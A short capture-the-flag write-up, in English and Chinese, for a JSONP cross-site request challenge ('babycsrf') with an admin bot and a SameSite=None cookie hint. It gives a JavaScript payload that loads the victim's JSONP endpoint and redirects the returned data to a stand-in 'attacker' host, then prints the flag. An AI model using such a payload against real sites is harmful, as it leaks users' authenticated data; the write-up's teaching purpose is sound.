# 题目描述

JSONP is a old pattern for getting data into JS, but I heard it's insecure because an attacker can specify code instead of a function name. I solved this problem by not letting you change the name.

For this challenge you will need to submit a URL to the admin bot (a program that runs a browser and directs it to visit your URL, simulating a real person clicking your link). I recommend learning how to use [ngrok](https://ngrok.com/) if you don't know how to expose local solutions to the internet - I've also provided a template server using Python and Flask for your solution.

**Hint!** The admin's cookie is set with SameSite=None

# 解决方案

直接自己起个服务器，直接用payload打即可，因为提示`SameSite=None`，所以服务器会把它的cookie发送到我们起的服务器上，payload如下：

```
window.setMessage = (m) => {
    document.location = `https://attacker/?${m}`;
}
window.onload = () => {
    s = document.createElement("script");
    s.src = "https://babycsrf-web.chal.irisc.tf/api";
    document.body.appendChild(s);
}
```

```
irisctf{jsonp_is_never_the_answer}
```